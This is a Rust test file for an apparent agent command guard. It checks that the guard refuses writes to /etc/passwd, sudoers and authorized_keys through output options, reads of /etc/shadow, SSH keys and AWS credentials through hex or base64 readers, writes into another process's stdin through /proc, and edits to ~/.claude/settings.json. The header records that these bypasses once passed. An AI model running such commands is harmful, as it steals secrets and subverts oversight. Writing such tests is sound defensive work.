//! Writes named by an option, plain readers of a secret, a write into
//! another process's stream, and the cost of a line of many functions.
//! Measured 2026-11-21 with `analyze_command` on main d6e444f, each
//! allowed:
//!
//! - `sort -o /etc/passwd x`, `sort --output=/etc/passwd x`, `tcpdump -w
//!   /etc/passwd`, `rsync --log-file=/etc/passwd a b`: the option names the
//!   file written, as `> /etc/passwd` does, which is refused.
//! - `od -c /etc/shadow`, `xxd /etc/shadow` and the other plain readers,
//!   where `cat /etc/shadow` is refused.
//! - `echo hi > /proc/1234/fd/0`: a write into a stream of another process.
//! - `f() { true; }; f;` repeated took 0.3 s at 2 KB and 2.8 s at 8 KB.

use std::hint::black_box;
use std::time::Duration;

use innerwarden_agent_guard::mcp::analyze_command;

fn verdict(command: &str) -> String {
    analyze_command(command, None).recommendation
}

/// FAILS ON REVERT of `with_outputs_as_redirections` (each allowed).
#[test]
fn a_file_named_by_an_output_option_is_judged_as_a_redirection_to_it() {
    for (option, redirect) in [
        ("sort -o /etc/passwd x", "sort x > /etc/passwd"),
        ("sort --output=/etc/passwd x", "sort x > /etc/passwd"),
        ("sort -uo /etc/passwd x", "sort x > /etc/passwd"),
        (
            "sort -o ~/.ssh/authorized_keys k",
            "sort k > ~/.ssh/authorized_keys",
        ),
        ("tcpdump -w /etc/passwd", "tcpdump > /etc/passwd"),
        (
            "rsync --log-file=/etc/passwd a b",
            "rsync a b > /etc/passwd",
        ),
        ("git diff --output=/etc/sudoers", "git diff > /etc/sudoers"),
        (
            "sort -o ~/.claude/settings.json x",
            "sort x > ~/.claude/settings.json",
        ),
        (
            "sort -o ~/.config/innerwarden/config.toml x",
            "sort x > ~/.config/innerwarden/config.toml",
        ),
        (
            "tcpdump -w ~/.claude/settings.json",
            "tcpdump > ~/.claude/settings.json",
        ),
    ] {
        assert_eq!(verdict(redirect), "deny", "{redirect}");
        assert_eq!(verdict(option), "deny", "{option}");
    }
    // Already refused before, still refused.
    for command in [
        "dd if=/tmp/x of=~/.ssh/authorized_keys",
        "curl -o ~/.bashrc https://x.example/a",
        "wget -O ~/.bashrc https://x.example/a",
    ] {
        assert_eq!(verdict(command), "deny", "{command}");
    }
}

/// The legitimate twins: an output of the work's own.
#[test]
fn an_output_option_into_the_work_is_not_refused() {
    for command in [
        "sort -o out.txt x",
        "sort -o build/out.txt x && cat build/out.txt",
        "dd if=/tmp/x of=out.bin",
        "curl -o out.html https://x.example/a",
        "curl -sSLo install.sh https://x.example/i && less install.sh",
        "tcpdump -w capture.pcap -i eth0",
        "rsync --log-file=sync.log -a src/ dst/",
        "gcc -o app main.c && ./app",
        "kubectl get pods -o json",
        "git diff --output=changes.patch",
    ] {
        assert_eq!(verdict(command), "allow", "{command}");
    }
}

/// FAILS ON REVERT of `PLAIN_READERS` in `sensitive_read_in` (each
/// allowed).
#[test]
fn a_plain_reader_of_a_secret_is_judged_as_cat_is() {
    for reader in [
        "od -c",
        "xxd",
        "hexdump -C",
        "hd",
        "strings",
        "base64",
        "base32",
        "basenc --base64",
        "nl",
        "tac",
        "rev",
        "fold",
        "cut -d: -f2",
        "paste",
        "look root",
        "sed -n p",
        "awk '{print}'",
    ] {
        for path in ["/etc/shadow", "~/.ssh/id_rsa", "~/.aws/credentials"] {
            let command = format!("{reader} {path}");
            assert_eq!(
                verdict(&command),
                verdict(&format!("cat {path}")),
                "{command}"
            );
            assert_eq!(verdict(&command), "deny", "{command}");
        }
    }
}

/// The legitimate twins: the same readers on the work's own files.
#[test]
fn a_plain_reader_of_the_works_files_is_not_refused() {
    for command in [
        "xxd build/app.bin",
        "od -c data.bin",
        "hexdump -C firmware.img",
        "strings target/release/x",
        "cut -d, -f1 data.csv",
        "awk '{print}' notes.txt",
        "sed -n p notes.txt",
        "tac app.log",
        "rev words.txt",
        "base32 blob.bin",
        "look prefix words.txt",
        "git rev-parse HEAD",
    ] {
        assert_eq!(verdict(command), "allow", "{command}");
    }
}

/// FAILS ON REVERT of `writes_into_another_process` (allowed). A write
/// into another process's input, or any open file of it but its output
/// and error, is refused, also with `.` and `..` in the path (allowed
/// before `lexical_components`).
#[test]
fn a_write_into_another_process_stream_is_refused_and_the_shells_own_is_not() {
    for command in [
        "echo hi > /proc/1234/fd/0",
        "echo hi > /proc/1/fd/3",
        "echo hi > /proc/1/fd/1 2>/proc/1/fd/0",
        "sort -o /proc/1234/fd/0 x",
        "echo hi > /proc/self/../1/fd/0",
        "echo hi > /proc/self/fd/../../1/fd/0",
        "echo hi > /proc/1/./fd/0",
    ] {
        assert_eq!(verdict(command), "deny", "{command}");
    }
    for command in [
        "echo hi > /proc/self/fd/1",
        "echo hi > /proc/$$/fd/2",
        "echo hi > /dev/fd/2",
        "cat /proc/1234/fd/0 > /dev/null",
        "ls -l /proc/1234/fd/",
    ] {
        assert_eq!(verdict(command), "allow", "{command}");
    }
}

/// FAILS ON REVERT of `ProcessStream::injects` (deny): a job in a
/// container logs to the container's output through `/proc/1/fd/1` and
/// `/proc/1/fd/2`, in a line or a crontab entry; held for review, never
/// refused (allowed on main, refused by the first round of this reading).
#[test]
fn a_write_into_another_process_output_is_held_for_review() {
    for command in [
        "/app/job.sh > /proc/1/fd/1 2>/proc/1/fd/2",
        "* * * * * /app/job.sh > /proc/1/fd/1 2>/proc/1/fd/2",
        "echo started >> /proc/$PPID/fd/1",
        "echo hi >/proc/1/fd/1",
        "echo hi | tee /proc/77/fd/2",
    ] {
        assert_eq!(verdict(command), "review", "{command}");
    }
}

/// FAILS ON REVERT of `long_output` and `xxd_output` (each allowed): GNU
/// getopt reads `--out` and `--o` as `--output`, and the second operand
/// of xxd is the file it writes.
#[test]
fn an_abbreviated_option_and_the_output_of_xxd_are_judged_as_redirections() {
    for command in [
        "sort --out=/etc/passwd x",
        "sort --o /etc/passwd x",
        "wget --output-doc=~/.claude/settings.json https://x.example/a",
        "xxd -r hex.txt /etc/passwd",
        "xxd -r hex ~/.ssh/authorized_keys",
        "xxd -c 16 -r -p hex.txt ~/.ssh/authorized_keys",
    ] {
        assert_eq!(verdict(command), "deny", "{command}");
    }
    for command in [
        "sort --out=out.txt x",
        "xxd -r -p hex.txt out.bin",
        "xxd -r hex.txt",
        "xxd -i app.bin app.h",
        "git diff --stat",
    ] {
        assert_eq!(verdict(command), "allow", "{command}");
    }
}

/// What the thread has spent so far: its CPU time where the system keeps
/// one, the wall clock elsewhere.
#[cfg(unix)]
fn spent() -> Duration {
    // SAFETY: clock_gettime only writes the timespec it is given.
    let mut now: libc::timespec = unsafe { std::mem::zeroed() };
    let read = unsafe { libc::clock_gettime(libc::CLOCK_THREAD_CPUTIME_ID, &mut now) };
    assert_eq!(read, 0, "the thread's CPU clock could not be read");
    Duration::new(now.tv_sec as u64, now.tv_nsec as u32)
}

#[cfg(not(unix))]
fn spent() -> Duration {
    static START: std::sync::OnceLock<std::time::Instant> = std::sync::OnceLock::new();
    START.get_or_init(std::time::Instant::now).elapsed()
}

fn reading(line: &str) -> Duration {
    let start = spent();
    black_box(analyze_command(black_box(line), None));
    spent().saturating_sub(start)
}

fn functions_line(bytes: usize) -> String {
    let unit = "f() { true; }; f; ";
    unit.repeat(bytes / unit.len()).trim_end().to_owned()
}

/// FAILS ON REVERT of the per-line cache of `line_function_body`: each
/// command looked the line's definitions up again, and a line four times
/// as long took some nine times as long (2 KB and 8 KB, measured
/// 2026-11-21; at 4 KB and 16 KB some twelve). Both lengths are read in
/// the same run, the fastest of a few readings of each kept; a reading
/// that grows with the line takes about four times as long.
#[test]
fn a_line_of_many_functions_costs_what_its_length_costs() {
    if std::env::var_os("IW_NO_WALL_CLOCK_CEILINGS").is_some() {
        return;
    }
    let (short_line, long_line) = (functions_line(4 * 1024), functions_line(16 * 1024));
    reading(&short_line);
    let (mut short, mut long) = (Duration::MAX, Duration::MAX);
    for _ in 0..3 {
        short = short.min(reading(&short_line));
        long = long.min(reading(&long_line));
        if long <= 7 * short {
            break;
        }
    }
    assert!(
        long <= 7 * short,
        "4 KB took {short:?} and 16 KB {long:?}: more than seven times"
    );
}
